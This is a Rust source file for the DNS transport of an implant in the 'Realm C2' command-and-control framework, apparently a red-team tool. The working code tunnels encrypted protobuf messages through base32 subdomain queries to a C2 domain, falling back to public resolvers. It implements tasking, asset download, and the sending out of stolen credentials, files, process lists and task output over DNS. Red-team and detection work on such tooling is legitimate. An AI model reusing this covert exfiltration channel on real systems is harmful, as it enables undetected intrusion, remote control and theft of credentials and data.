// DNS transport implementation for Realm C2
// This module provides DNS-based communication with stateless packet protocol

use anyhow::Result;
use pb::c2::*;
use pb::dns::*;
use prost::Message;
use std::sync::mpsc::{Receiver, Sender};
use tokio::net::UdpSocket;
use crate::Transport;

// Protocol limits
const MAX_LABEL_LENGTH: usize = 63;
const MAX_DNS_NAME_LENGTH: usize = 253;
const CONV_ID_LENGTH: usize = 8;

// Async protocol configuration
const SEND_WINDOW_SIZE: usize = 10;  // Packets in flight
const MAX_RETRIES_PER_CHUNK: u32 = 3; // Max retries for a chunk
const MAX_DATA_SIZE: usize = 50 * 1024 * 1024; // 50MB max data size

// DNS resolver fallbacks
const FALLBACK_DNS_SERVERS: &[&str] = &["1.1.1.1:53", "8.8.8.8:53"];

/// DNS record type for queries
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DnsRecordType {
    TXT,  // Text records (default, base32 encoded)
    A,    // IPv4 address records (binary data)
    AAAA, // IPv6 address records (binary data)
}

/// DNS transport using stateless packet protocol with protobuf
#[derive(Debug, Clone)]
pub struct DNS {
    base_domain: String,
    dns_servers: Vec<String>, // Primary + fallback DNS servers
    current_server_index: usize,
    record_type: DnsRecordType, // DNS record type to use for queries
}

impl DNS {
    /// Marshal request using ChaCha encoding
    fn marshal_with_codec<Req, Resp>(msg: Req) -> Result<Vec<u8>>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        pb::xchacha::encode_with_chacha::<Req, Resp>(msg)
    }

    /// Unmarshal response using ChaCha encoding
    fn unmarshal_with_codec<Req, Resp>(data: &[u8]) -> Result<Resp>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        pb::xchacha::decode_with_chacha::<Req, Resp>(data)
    }

    /// Generate unique conversation ID
    fn generate_conv_id() -> String {
        use rand::Rng;
        const CHARSET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
        let mut rng = rand::thread_rng();
        (0..CONV_ID_LENGTH)
            .map(|_| {
                let idx = rng.gen_range(0..CHARSET.len());
                CHARSET[idx] as char
            })
            .collect()
    }

    /// Calculate CRC32 checksum
    fn calculate_crc32(data: &[u8]) -> u32 {
        let mut crc = 0xffffffffu32;
        for &byte in data {
            crc ^= byte as u32;
            for _ in 0..8 {
                if crc & 1 != 0 {
                    crc = (crc >> 1) ^ 0xedb88320;
                } else {
                    crc >>= 1;
                }
            }
        }
        !crc
    }

    /// Calculate maximum data size that will fit in DNS query
    fn calculate_max_chunk_size(&self, total_chunks: u32) -> usize {
        // DNS limit: total_length <= 253
        // Format: <label1>.<label2>....<labelN>.<base_domain>
        // total_length = encoded_length + ceil(encoded_length / 63) + base_domain_length

        let base_domain_len = self.base_domain.len();
        let available = MAX_DNS_NAME_LENGTH.saturating_sub(base_domain_len);

        // Calculate max encoded length where: encoded + ceil(encoded/63) <= available
        // For n complete labels (63 chars each): n*63 + n = n*64
        // So: floor(available / 64) * 63 gives us the safe amount
        let complete_labels = available / 64;
        let max_encoded_length = complete_labels * 63;

        // Base32: 5 bytes protobuf -> 8 chars encoded
        // protobuf_length = encoded_length * 5 / 8
        let max_protobuf_length = (max_encoded_length * 5) / 8;

        // Calculate protobuf overhead with worst-case varint sizes
        let sample_packet = DnsPacket {
            r#type: PacketType::Data.into(),
            sequence: total_chunks,
            conversation_id: "a".repeat(CONV_ID_LENGTH),
            data: vec![],
            crc32: 0xFFFFFFFF,
            window_size: SEND_WINDOW_SIZE as u32,
            acks: vec![],
            nacks: vec![],
        };

        let overhead = sample_packet.encoded_len();

        // Max data size is what fits after overhead
        max_protobuf_length.saturating_sub(overhead)
    }

    /// Encode data using Base32 (DNS-safe, case-insensitive)
    fn encode_data(data: &[u8]) -> String {
        // Use RFC4648 alphabet (A-Z, 2-7) without padding, converted to lowercase
        base32::encode(base32::Alphabet::Rfc4648 { padding: false }, data).to_lowercase()
    }

    /// Build DNS query subdomain from packet
    /// Format: <base32_encoded_packet>.<base_domain>
    /// Base32 data is split into 63-char labels, total length <= 253 chars
    fn build_subdomain(&self, packet: &DnsPacket) -> Result<String> {
        // Serialize packet to protobuf
        let mut buf = Vec::new();
        packet.encode(&mut buf)?;

        // Encode entire packet as Base32 (includes all metadata)
        let encoded = Self::encode_data(&buf);

        // Calculate total length
        let base_domain_len = self.base_domain.len();
        let num_labels = (encoded.len() + MAX_LABEL_LENGTH - 1) / MAX_LABEL_LENGTH;
        let total_len = encoded.len() + num_labels + base_domain_len; // +num_labels for dots between labels, +1 for dot before base_domain

        if total_len > MAX_DNS_NAME_LENGTH {
            return Err(anyhow::anyhow!(
                "DNS query too long: {} chars (max {}). protobuf={} bytes, encoded={} chars, labels={}, base_domain={} chars. Data in packet was {} bytes.",
                total_len,
                MAX_DNS_NAME_LENGTH,
                buf.len(),
                encoded.len(),
                num_labels,
                base_domain_len,
                packet.data.len()
            ));
        }

        // Split encoded data
        let mut labels = Vec::new();
        let mut remaining = encoded.as_str();
        while remaining.len() > MAX_LABEL_LENGTH {
            let (chunk, rest) = remaining.split_at(MAX_LABEL_LENGTH);
            labels.push(chunk);
            remaining = rest;
        }
        if !remaining.is_empty() {
            labels.push(remaining);
        }

        // Build final domain: <label1>.<label2>....<base_domain>
        labels.push(&self.base_domain);
        Ok(labels.join("."))
    }

    /// Send packet and get response with resolver fallback
    async fn send_packet(&mut self, packet: DnsPacket) -> Result<Vec<u8>> {
        let subdomain = self.build_subdomain(&packet)?;
        let (query, txid) = self.build_dns_query(&subdomain)?;

        // Try each DNS server in order
        let mut last_error = None;
        for attempt in 0..self.dns_servers.len() {
            let server_idx = (self.current_server_index + attempt) % self.dns_servers.len();
            let server = &self.dns_servers[server_idx];

            match self.try_dns_query(server, &query, txid).await {
                Ok(response) => {
                    // Update current server on success
                    self.current_server_index = server_idx;
                    return Ok(response);
                }
                Err(e) => {
                    last_error = Some(e);
                    // Continue to next resolver
                }
            }
        }

        Err(last_error.unwrap_or_else(|| anyhow::anyhow!("All DNS servers failed")))
    }

    /// Try a single DNS query against a specific server
    async fn try_dns_query(&self, server: &str, query: &[u8], expected_txid: u16) -> Result<Vec<u8>> {
        // Create UDP socket with timeout
        let socket = UdpSocket::bind("0.0.0.0:0").await?;
        socket.connect(server).await?;

        // Send query
        socket.send(query).await?;

        // Receive response with timeout
        let mut buf = vec![0u8; 4096];
        let timeout_duration = std::time::Duration::from_secs(5);
        let len = tokio::time::timeout(timeout_duration, socket.recv(&mut buf))
            .await
            .map_err(|_| anyhow::anyhow!("DNS query timeout"))??;
        buf.truncate(len);

        // Parse and validate response
        self.parse_dns_response(&buf, expected_txid)
    }

    /// Build DNS query packet with random transaction ID
    fn build_dns_query(&self, domain: &str) -> Result<(Vec<u8>, u16)> {
        let mut query = Vec::new();

        // Transaction ID (random for security)
        let txid = rand::random::<u16>();
        query.extend_from_slice(&txid.to_be_bytes());
        // Flags: standard query
        query.extend_from_slice(&[0x01, 0x00]);
        // Questions: 1
        query.extend_from_slice(&[0x00, 0x01]);
        // Answer RRs: 0
        query.extend_from_slice(&[0x00, 0x00]);
        // Authority RRs: 0
        query.extend_from_slice(&[0x00, 0x00]);
        // Additional RRs: 0
        query.extend_from_slice(&[0x00, 0x00]);

        // Question section
        for label in domain.split('.') {
            if label.is_empty() {
                continue;
            }
            query.push(label.len() as u8);
            query.extend_from_slice(label.as_bytes());
        }
        query.push(0x00); // End of domain

        // Type and Class based on record_type
        match self.record_type {
            DnsRecordType::TXT => {
                // Type: TXT (16)
                query.extend_from_slice(&[0x00, 0x10]);
            }
            DnsRecordType::A => {
                // Type: A (1)
                query.extend_from_slice(&[0x00, 0x01]);
            }
            DnsRecordType::AAAA => {
                // Type: AAAA (28)
                query.extend_from_slice(&[0x00, 0x1c]);
            }
        }
        // Class: IN (1)
        query.extend_from_slice(&[0x00, 0x01]);

        Ok((query, txid))
    }

    /// Parse DNS response based on record type, validating transaction ID
    fn parse_dns_response(&self, response: &[u8], expected_txid: u16) -> Result<Vec<u8>> {
        if response.len() < 12 {
            return Err(anyhow::anyhow!("DNS response too short"));
        }

        // Validate transaction ID
        let response_txid = u16::from_be_bytes([response[0], response[1]]);
        if response_txid != expected_txid {
            return Err(anyhow::anyhow!("DNS transaction ID mismatch: expected {}, got {}", expected_txid, response_txid));
        }

        // Read answer count from header
        let answer_count = u16::from_be_bytes([response[6], response[7]]) as usize;

        // Skip to answer section
        let mut offset = 12;

        // Skip question section
        while offset < response.len() && response[offset] != 0 {
            let len = response[offset] as usize;
            offset += len + 1;
        }
        offset += 5; // Skip null terminator, type, and class

        // Parse all answer records and concatenate data
        let mut all_data = Vec::new();

        for _ in 0..answer_count {
            if offset + 10 > response.len() {
                return Err(anyhow::anyhow!("Invalid DNS response format"));
            }

            // Skip name (2 bytes pointer), type (2), class (2), TTL (4)
            offset += 10;

            // Read data length
            let data_len = u16::from_be_bytes([response[offset], response[offset + 1]]) as usize;
            offset += 2;

            if offset + data_len > response.len() {
                return Err(anyhow::anyhow!("Invalid DNS record length"));
            }

            // Parse based on record type
            match self.record_type {
                DnsRecordType::TXT => {
                    // TXT records have length-prefixed strings
                    let mut txt_offset = offset;
                    while txt_offset < offset + data_len {
                        let str_len = response[txt_offset] as usize;
                        txt_offset += 1;
                        if txt_offset + str_len > offset + data_len {
                            break;
                        }
                        all_data.extend_from_slice(&response[txt_offset..txt_offset + str_len]);
                        txt_offset += str_len;
                    }
                }
                DnsRecordType::A | DnsRecordType::AAAA => {
                    // A records are 4 bytes, AAAA records are 16 bytes - append raw binary
                    all_data.extend_from_slice(&response[offset..offset + data_len]);
                }
            }

            offset += data_len;
        }

        // For A/AAAA records, data is base32-encoded text that needs decoding
        if matches!(self.record_type, DnsRecordType::A | DnsRecordType::AAAA) {
            // Trim null bytes from padding in A/AAAA records
            while all_data.last() == Some(&0) {
                all_data.pop();
            }

            let encoded_str = String::from_utf8(all_data)
                .map_err(|e| anyhow::anyhow!("Invalid UTF-8 in A/AAAA response: {}", e))?;
            all_data = base32::decode(base32::Alphabet::Rfc4648 { padding: false }, &encoded_str.to_uppercase())
                .ok_or_else(|| anyhow::anyhow!("Failed to decode base32 from A/AAAA records"))?;
        }

        Ok(all_data)
    }

    /// Send request and receive response using DNS protocol
    async fn dns_exchange<Req, Resp>(&mut self, request: Req, method_code: &str) -> Result<Resp>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        // Marshal request
        let request_data = Self::marshal_with_codec::<Req, Resp>(request)?;

        // Send raw bytes and unmarshal response
        let response_data = self.dns_exchange_raw(request_data, method_code).await?;
        Self::unmarshal_with_codec::<Req, Resp>(&response_data)
    }

    /// Send raw request bytes and receive raw response bytes using DNS protocol with async transmission
    /// Uses windowed transmission with ACK/NACK-based retransmission
    async fn dns_exchange_raw(&mut self, request_data: Vec<u8>, method_code: &str) -> Result<Vec<u8>> {
        use std::collections::{HashSet, HashMap};

        // Validate data size
        if request_data.len() > MAX_DATA_SIZE {
            return Err(anyhow::anyhow!(
                "Request data exceeds maximum size: {} bytes > {} bytes",
                request_data.len(),
                MAX_DATA_SIZE
            ));
        }

        // Calculate exact chunk_size and total_chunks using varint boundary solving
        // Protobuf varints encode differently based on value:
        // [1, 127] → 1 byte, [128, 16383] → 2 bytes, [16384, 2097151] → 3 bytes
        let (chunk_size, total_chunks) = if request_data.is_empty() {
            (self.calculate_max_chunk_size(1), 1)
        } else {
            let varint_ranges = [
                (1u32, 127u32),
                (128u32, 16383u32),
                (16384u32, 2097151u32),
            ];

            let mut result = None;
            for (min_chunks, max_chunks) in varint_ranges.iter() {
                // Calculate overhead assuming worst case (max sequence in this range)
                let chunk_size = self.calculate_max_chunk_size(*max_chunks);
                let total_chunks = ((request_data.len() + chunk_size - 1) / chunk_size).max(1);

                // Check if the calculated total_chunks falls within this range
                if total_chunks >= *min_chunks as usize && total_chunks <= *max_chunks as usize {
                    // Found the correct range - this is exact
                    result = Some((chunk_size, total_chunks));
                    break;
                }
            }

            // Fallback for very large data (shouldn't happen with 50MB limit)
            result.unwrap_or_else(|| {
                let chunk_size = self.calculate_max_chunk_size(2097151);
                let total_chunks = ((request_data.len() + chunk_size - 1) / chunk_size).max(1);
                (chunk_size, total_chunks)
            })
        };

        let data_crc = Self::calculate_crc32(&request_data);

        log::debug!("DNS: Request size={} bytes, chunks={}, chunk_size={} bytes, crc32={:#x}",
            request_data.len(), total_chunks, chunk_size, data_crc);

        // Generate conversation ID
        let conv_id = Self::generate_conv_id();

        // Send INIT packet
        let init_payload = InitPayload {
            method_code: method_code.to_string(),
            total_chunks: total_chunks as u32,
            data_crc32: data_crc,
            file_size: request_data.len() as u32,
        };
        let mut init_payload_bytes = Vec::new();
        init_payload.encode(&mut init_payload_bytes)?;

        log::debug!("DNS: INIT packet - conv_id={}, method={}, total_chunks={}, file_size={}, data_crc32={:#x}",
            conv_id, method_code, total_chunks, request_data.len(), data_crc);

        let init_packet = DnsPacket {
            r#type: PacketType::Init.into(),
            sequence: 0,
            conversation_id: conv_id.clone(),
            data: init_payload_bytes,
            crc32: 0,
            window_size: SEND_WINDOW_SIZE as u32,
            acks: vec![],
            nacks: vec![],
        };

        match self.send_packet(init_packet).await {
            Ok(_) => {
                log::debug!("DNS: INIT sent for conv_id={}", conv_id);
            }
            Err(e) => {
                return Err(anyhow::anyhow!("Failed to send INIT packet to DNS server: {}.", e));
            }
        }

        // Async windowed transmission
        let mut acknowledged = HashSet::new(); // Fully acknowledged chunks
        let mut nack_set = HashSet::new();
        let mut retry_counts: HashMap<u32, u32> = HashMap::new();

        // Prepare chunks
        let chunks: Vec<Vec<u8>> = request_data
            .chunks(chunk_size)
            .map(|chunk| chunk.to_vec())
            .collect();

        // Send all chunks and collect ACKs/NACKs
        // In async mode, each DATA packet gets immediate STATUS response via DNS request-response
        for seq in 1..=total_chunks {
            let seq_u32 = seq as u32;

            // Skip if already acknowledged
            if acknowledged.contains(&seq_u32) {
                continue;
            }

            let chunk = &chunks[seq - 1];

            let data_packet = DnsPacket {
                r#type: PacketType::Data.into(),
                sequence: seq_u32,
                conversation_id: conv_id.clone(),
                data: chunk.clone(),
                crc32: Self::calculate_crc32(chunk),
                window_size: SEND_WINDOW_SIZE as u32,
                acks: vec![],
                nacks: vec![],
            };

            // Send DATA packet and get STATUS response
            match self.send_packet(data_packet).await {
                Ok(response_data) => {
                    // The response could be:
                    // 1. A marshaled STATUS packet (protobuf)
                    // 2. Plain "ok" string (backward compat)
                    // 3. Error response

                    // Try to parse as STATUS packet (protobuf)
                    if let Ok(status_packet) = DnsPacket::decode(&response_data[..]) {
                        if status_packet.r#type == PacketType::Status.into() {
                            // Process ACKs - mark as acknowledged
                            for ack_range in &status_packet.acks {
                                for ack_seq in ack_range.start_seq..=ack_range.end_seq {
                                    acknowledged.insert(ack_seq);
                                    retry_counts.remove(&ack_seq);
                                }
                            }

                            // Process NACKs - queue for retransmission
                            for &nack_seq in &status_packet.nacks {
                                if nack_seq >= 1 && nack_seq <= total_chunks as u32 {
                                    nack_set.insert(nack_seq);
                                }
                            }
                        }
                    } else if response_data == b"ok" {
                        // Legacy "ok" response - assume this chunk was accepted
                        acknowledged.insert(seq_u32);
                    } else {
                        // Unknown response format - assume need to retry this chunk
                        log::debug!("DNS: Unknown response format ({} bytes), retrying chunk", response_data.len());
                        nack_set.insert(seq_u32);
                    }
                }
                Err(e) => {
                    // DNS query failed - check if it's a size issue or transient error
                    let err_msg = e.to_string();
                    eprintln!("DNS ERROR: Failed to send chunk {}: {}", seq_u32, err_msg);

                    // If packet is too long, this is a fatal error (can't fix with retries)
                    if err_msg.contains("DNS query too long") {
                        return Err(anyhow::anyhow!(
                            "Chunk {} is too large to fit in DNS query: {}",
                            seq_u32,
                            err_msg
                        ));
                    }

                    // Check for connection/network errors
                    if err_msg.contains("timeout") || err_msg.contains("refused") || err_msg.contains("unreachable") {
                        eprintln!("DNS ERROR: Connection to DNS server failed.");
                    }

                    // Otherwise, mark for retry (transient network error)
                    nack_set.insert(seq_u32);
                }
            }
        }

        // Retry NACKed chunks
        while !nack_set.is_empty() {
            let nacks_to_retry: Vec<u32> = nack_set.drain().collect();

            for nack_seq in nacks_to_retry {
                // Check retry limit
                let retries = retry_counts.entry(nack_seq).or_insert(0);
                if *retries >= MAX_RETRIES_PER_CHUNK {
                    return Err(anyhow::anyhow!(
                        "Max retries exceeded for chunk {}",
                        nack_seq
                    ));
                }
                *retries += 1;

                // Skip if already acknowledged (may have been ACKed in another response)
                if acknowledged.contains(&nack_seq) {
                    continue;
                }

                if let Some(chunk) = chunks.get((nack_seq - 1) as usize) {
                    let retransmit_packet = DnsPacket {
                        r#type: PacketType::Data.into(),
                        sequence: nack_seq,
                        conversation_id: conv_id.clone(),
                        data: chunk.clone(),
                        crc32: Self::calculate_crc32(chunk),
                        window_size: SEND_WINDOW_SIZE as u32,
                        acks: vec![],
                        nacks: vec![],
                    };

                    match self.send_packet(retransmit_packet).await {
                        Ok(response_data) => {
                            // Parse STATUS response
                            if let Ok(status_packet) = DnsPacket::decode(&response_data[..]) {
                                if status_packet.r#type == PacketType::Status.into() {
                                    // Process ACKs
                                    for ack_range in &status_packet.acks {
                                        for ack_seq in ack_range.start_seq..=ack_range.end_seq {
                                            acknowledged.insert(ack_seq);
                                            retry_counts.remove(&ack_seq);
                                        }
                                    }

                                    // Process NACKs
                                    for &new_nack in &status_packet.nacks {
                                        if new_nack >= 1 && new_nack <= total_chunks as u32 && !acknowledged.contains(&new_nack) {
                                            nack_set.insert(new_nack);
                                        }
                                    }
                                }
                            }
                        }
                        Err(_) => {
                            // Retry failed - add back to NACK set
                            nack_set.insert(nack_seq);
                        }
                    }
                }
            }
        }

        // Verify all chunks acknowledged
        if acknowledged.len() != total_chunks {
            return Err(anyhow::anyhow!(
                "Not all chunks acknowledged after max retries: {}/{} chunks. Missing: {:?}",
                acknowledged.len(),
                total_chunks,
                (1..=total_chunks as u32).filter(|seq| !acknowledged.contains(seq)).collect::<Vec<_>>()
            ));
        }

        log::debug!("DNS: All {} chunks acknowledged, sending FETCH", total_chunks);

        // All data sent and acknowledged
        // Now request the response via FETCH (or END for backward compatibility)
        // Send FETCH packet to get response
        let fetch_packet = DnsPacket {
            r#type: PacketType::Fetch.into(),
            sequence: (total_chunks + 1) as u32,
            conversation_id: conv_id.clone(),
            data: vec![],
            crc32: 0,
            window_size: 0,
            acks: vec![],
            nacks: vec![],
        };

        let end_response = match self.send_packet(fetch_packet).await {
            Ok(resp) => {
                log::debug!("DNS: FETCH response received ({} bytes)", resp.len());
                resp
            }
            Err(e) => {
                return Err(anyhow::anyhow!(
                    "Failed to fetch response from server: {}.",
                    e
                ));
            }
        };

        // Validate response is not empty
        if end_response.is_empty() {
            return Err(anyhow::anyhow!(
                "Server returned empty response."
            ));
        }

        // Check if response contains ResponseMetadata (chunked response indicator)
        if end_response.len() > 2 && end_response != b"ok" {
            // Try to parse as ResponseMetadata (plain protobuf, not encrypted)
            if let Ok(metadata) = ResponseMetadata::decode(&end_response[..]) {
                // Response is chunked - fetch all chunks
                let total_chunks = metadata.total_chunks as usize;
                let expected_crc = metadata.data_crc32;

                // Fetch all encrypted response chunks and concatenate
                let mut full_response = Vec::new();
                for chunk_idx in 1..=total_chunks {
                    // Create FetchPayload with 1-based chunk index
                    let fetch_payload = FetchPayload {
                        chunk_index: chunk_idx as u32,
                    };
                    let mut fetch_payload_bytes = Vec::new();
                    fetch_payload.encode(&mut fetch_payload_bytes)?;

                    let fetch_packet = DnsPacket {
                        r#type: PacketType::Fetch.into(),
                        sequence: (total_chunks as u32 + 2 + chunk_idx as u32),
                        conversation_id: conv_id.clone(),
                        data: fetch_payload_bytes,
                        crc32: 0,
                        window_size: 0,
                        acks: vec![],
                        nacks: vec![],
                    };

                    // Each chunk is encrypted - get raw chunk data
                    let chunk_data = self.send_packet(fetch_packet).await?;
                    full_response.extend_from_slice(&chunk_data);
                }

                // Verify CRC of the complete encrypted response
                let actual_crc = Self::calculate_crc32(&full_response);
                if actual_crc != expected_crc {
                    return Err(anyhow::anyhow!(
                        "Response CRC mismatch: expected {}, got {}",
                        expected_crc,
                        actual_crc
                    ));
                }

                // Return the complete reassembled encrypted response data
                return Ok(full_response);
            }
        }

        // Single response (small enough to fit in one packet)
        Ok(end_response)
    }
}

impl Transport for DNS {
    fn init() -> Self {
        DNS {
            base_domain: String::new(),
            dns_servers: Vec::new(),
            current_server_index: 0,
            record_type: DnsRecordType::TXT,
        }
    }

    fn new(callback: String, _proxy_uri: Option<String>) -> Result<Self> {
        // Parse DNS URL formats:
        // dns://server:port?domain=example.com&type=txt (single server, TXT records)
        // dns://*?domain=example.com&type=a (use system DNS + fallbacks, A records)
        // dns://8.8.8.8:53,1.1.1.1:53?domain=example.com&type=aaaa (multiple servers, AAAA records)
        let url = if callback.starts_with("dns://") {
            callback
        } else {
            format!("dns://{}", callback)
        };

        let parsed = url::Url::parse(&url)?;
        let base_domain = parsed
            .query_pairs()
            .find(|(k, _)| k == "domain")
            .map(|(_, v)| v.to_string())
            .unwrap_or_else(|| "example.com".to_string());

        // Parse record type from URL (default: TXT)
        let record_type = parsed
            .query_pairs()
            .find(|(k, _)| k == "type")
            .map(|(_, v)| match v.to_lowercase().as_str() {
                "a" => DnsRecordType::A,
                "aaaa" => DnsRecordType::AAAA,
                _ => DnsRecordType::TXT,
            })
            .unwrap_or(DnsRecordType::TXT);

        let mut dns_servers = Vec::new();

        // Check if using wildcard for system DNS
        if let Some(host) = parsed.host_str() {
            if host == "*" {
                // Use system DNS servers + fallbacks
                #[cfg(feature = "dns")]
                {
                    use hickory_resolver::system_conf::read_system_conf;
                    if let Ok((config, _opts)) = read_system_conf() {
                        for server in config.name_servers() {
                            dns_servers.push(format!("{}:53", server.socket_addr.ip()));
                        }
                    }
                }
                // Add fallbacks
                dns_servers.extend(FALLBACK_DNS_SERVERS.iter().map(|s| s.to_string()));
            } else {
                // Parse comma-separated servers or single server
                for server_part in host.split(',') {
                    let server = server_part.trim();
                    let port = parsed.port().unwrap_or(53);
                    dns_servers.push(format!("{}:{}", server, port));
                }
            }
        }

        // If no servers configured, use fallbacks
        if dns_servers.is_empty() {
            dns_servers.extend(FALLBACK_DNS_SERVERS.iter().map(|s| s.to_string()));
        }

        Ok(DNS {
            base_domain,
            dns_servers,
            current_server_index: 0,
            record_type,
        })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        self.dns_exchange(request, "/c2.C2/ClaimTasks").await
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        sender: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        // Send fetch request and get raw response bytes
        let response_bytes = self.dns_exchange_raw(
            Self::marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?,
            "/c2.C2/FetchAsset"
        ).await?;

        // Parse length-prefixed encrypted chunks and send each one
        let mut offset = 0;
        while offset < response_bytes.len() {
            // Check if we have enough bytes for length prefix
            if offset + 4 > response_bytes.len() {
                break;
            }

            // Read 4-byte length prefix (big-endian)
            let chunk_len = u32::from_be_bytes([
                response_bytes[offset],
                response_bytes[offset + 1],
                response_bytes[offset + 2],
                response_bytes[offset + 3],
            ]) as usize;
            offset += 4;

            // Check if we have the full chunk
            if offset + chunk_len > response_bytes.len() {
                return Err(anyhow::anyhow!(
                    "Invalid chunk length: {} bytes at offset {}, total size {}",
                    chunk_len,
                    offset - 4,
                    response_bytes.len()
                ));
            }

            // Extract and decrypt chunk
            let encrypted_chunk = &response_bytes[offset..offset + chunk_len];
            let chunk_response = Self::unmarshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(encrypted_chunk)?;

            // Send chunk through channel
            if sender.send(chunk_response).is_err() {
                return Err(anyhow::anyhow!("Failed to send chunk: receiver dropped"));
            }

            offset += chunk_len;
        }

        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        self.dns_exchange(request, "/c2.C2/ReportCredential").await
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        // Spawn a task to collect chunks from the sync channel receiver
        // This is necessary because iterating over the sync receiver would block the async task
        let handle = tokio::spawn(async move {
            let mut all_chunks = Vec::new();

            // Iterate over the sync channel receiver in a spawned task to avoid blocking
            for chunk in request {
                // Encrypt each chunk individually (like old implementation)
                let chunk_bytes = Self::marshal_with_codec::<ReportFileRequest, ReportFileResponse>(chunk)?;
                // Prefix each chunk with its length (4 bytes, big-endian)
                all_chunks.extend_from_slice(&(chunk_bytes.len() as u32).to_be_bytes());
                all_chunks.extend_from_slice(&chunk_bytes);
            }

            Ok::<Vec<u8>, anyhow::Error>(all_chunks)
        });

        // Wait for the spawned task to complete
        let all_chunks = handle.await
            .map_err(|e| anyhow::anyhow!("Failed to join chunk collection task: {}", e))??;

        if all_chunks.is_empty() {
            return Err(anyhow::anyhow!("No file data provided"));
        }

        // Send all chunks as a single DNS exchange (chunks are already individually encrypted)
        // This is RAW data - multiple length-prefixed encrypted messages concatenated
        // Do NOT encrypt again - pass directly to server
        let response_bytes = self.dns_exchange_raw(all_chunks, "/c2.C2/ReportFile").await?;

        // Unmarshal response
        Self::unmarshal_with_codec::<ReportFileRequest, ReportFileResponse>(&response_bytes)
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        self.dns_exchange(request, "/c2.C2/ReportProcessList").await
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        self.dns_exchange(request, "/c2.C2/ReportTaskOutput").await
    }

    async fn reverse_shell(
        &mut self,
        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        Err(anyhow::anyhow!("reverse_shell not supported over DNS transport"))
    }
}
